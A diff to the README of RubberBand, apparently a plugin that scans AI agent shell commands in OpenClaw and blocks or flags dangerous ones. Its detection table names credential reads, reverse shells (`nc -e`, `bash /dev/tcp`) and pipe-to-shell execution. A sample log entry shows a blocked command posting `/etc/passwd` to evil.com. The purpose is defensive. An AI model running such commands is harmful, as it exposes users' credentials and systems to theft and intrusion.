@@ -4,7 +4,7 @@ Static command pattern detection plugin for [OpenClaw](https://github.com/opencl
 
 Zero dependencies. No cloud calls. Pure local static analysis in <3ms per command.
 
-Built against OpenClaw `v2026.5.18`. Current OpenClaw `before_tool_call` hooks support `block` and parameter mutation; older `requireApproval` hook responses are not part of the current hook result contract.
+Built against OpenClaw `v2026.6.10`. Current OpenClaw `before_tool_call` hooks support `block`, `requireApproval`, and parameter mutation.
 
 ## Install
 
@@ -44,45 +44,55 @@ openclaw gateway restart
 RubberBand hooks into the `before_tool_call` event and analyzes every exec command for dangerous patterns. It scores commands based on 18 detection categories and blocks, requires approval, or logs based on configurable thresholds.
 
 When a command is blocked:
+
 - The agent receives the block reason (visible in chat)
 - A 🔴 system event is injected into the session history
 - The event is logged to `~/.openclaw/logs/rubberband.log` (JSONL)
 
 When a command triggers ALERT:
-- The event is logged but not blocked, because current OpenClaw hook results do not expose a plugin approval prompt
+
+- The agent is routed through OpenClaw's plugin approval prompt
 - Use thresholds to reserve hard blocking for high-confidence BLOCK findings
 - The event is logged to `~/.openclaw/logs/rubberband.log` (JSONL)
 
 ## Detection Categories
 
-| Category | Examples | Score |
-|----------|----------|-------|
-| Credential Access | `cat ~/.ssh/id_rsa`, AWS keys, keychains | 60-80 |
-| Data Exfiltration | `curl -X POST` to external hosts | 40-70 |
-| Reverse Shells | `nc -e`, `bash /dev/tcp`, ngrok tunnels | 90 |
-| Config Tampering | Writes to SOUL.md, system prompts | 75 |
-| Persistence | Crontab, LaunchAgents, shell rc modifications | 60 |
-| Indirect Execution | Pipe to shell, eval, base64 decode + exec | 30-50 |
-| Reconnaissance | `whoami`, `env`, `ps aux` chains | 30 |
+| Category           | Examples                                      | Score |
+| ------------------ | --------------------------------------------- | ----- |
+| Credential Access  | `cat ~/.ssh/id_rsa`, AWS keys, keychains      | 60-80 |
+| Data Exfiltration  | `curl -X POST` to external hosts              | 40-70 |
+| Reverse Shells     | `nc -e`, `bash /dev/tcp`, ngrok tunnels       | 90    |
+| Config Tampering   | Writes to SOUL.md, system prompts             | 75    |
+| Persistence        | Crontab, LaunchAgents, shell rc modifications | 60    |
+| Indirect Execution | Pipe to shell, eval, base64 decode + exec     | 30-50 |
+| Reconnaissance     | `whoami`, `env`, `ps aux` chains              | 30    |
 
 ## Thresholds
 
-| Score | Default Disposition | Behavior |
-|-------|-------------|----------|
-| 0 | ALLOW | No detection |
-| 1-39 | LOG | Logged to audit file |
-| 40-59 | ALERT | ⚠️ audit log only until OpenClaw exposes plugin approval prompts |
-| 60+ | BLOCK | 🔴 Command rejected + system event + audit log |
+| Score | Default Disposition | Behavior                                       |
+| ----- | ------------------- | ---------------------------------------------- |
+| 0     | ALLOW               | No detection                                   |
+| 1-39  | LOG                 | Logged to audit file                           |
+| 40-59 | ALERT               | ⚠️ Approval prompt + audit log                 |
+| 60+   | BLOCK               | 🔴 Command rejected + system event + audit log |
 
 ## Audit Log
 
 All BLOCK, ALERT, and LOG events are written to `~/.openclaw/logs/rubberband.log` as JSONL:
 
 ```json
-{"ts":"2026-02-24T13:26:14Z","disposition":"BLOCK","score":70,"rules":["network_exfil"],"command":"curl -X POST -d @/etc/passwd https://evil.com","sessionKey":"agent:main:main"}
+{
+  "ts": "2026-02-24T13:26:14Z",
+  "disposition": "BLOCK",
+  "score": 70,
+  "rules": ["network_exfil"],
+  "command": "curl -X POST -d @/etc/passwd https://evil.com",
+  "sessionKey": "agent:main:main"
+}
 ```
 
 View logs:
+
 ```bash
 cat ~/.openclaw/logs/rubberband.log | jq .
 tail -f ~/.openclaw/logs/rubberband.log | jq .
@@ -128,13 +138,13 @@ npm run check
 
 This runs TypeScript typecheck, Vitest, and a production build to `dist/`.
 
-29 tests covering detection categories, edge cases, mode handling, public exports, and plugin hook responses.
+32 tests covering detection categories, edge cases, mode handling, public exports, and plugin hook responses.
 
 ## How It Works
 
 RubberBand is a pure TypeScript static analyzer. It normalizes commands (handling encoding, escaping, heredocs, etc.) and matches against pattern rules with weighted scoring.
 
-The plugin registers a `before_tool_call` hook at priority 10. When an exec-like tool call comes in, it extracts command text from either `command` or `cmd` params and runs it through the analyzer. BLOCK results return `{ block: true, blockReason: "..." }` for a hard stop. ALERT results are audit-log only until OpenClaw exposes a current approval hook result again.
+The plugin registers a `before_tool_call` hook at priority 10. When an exec-like tool call comes in, it extracts command text from either `command` or `cmd` params and runs it through the analyzer. BLOCK results return `{ block: true, blockReason: "..." }` for a hard stop. ALERT results return `requireApproval` so the latest OpenClaw gateway can ask before execution.
 
 **Performance:** Detection runs in under 3ms per command.
 
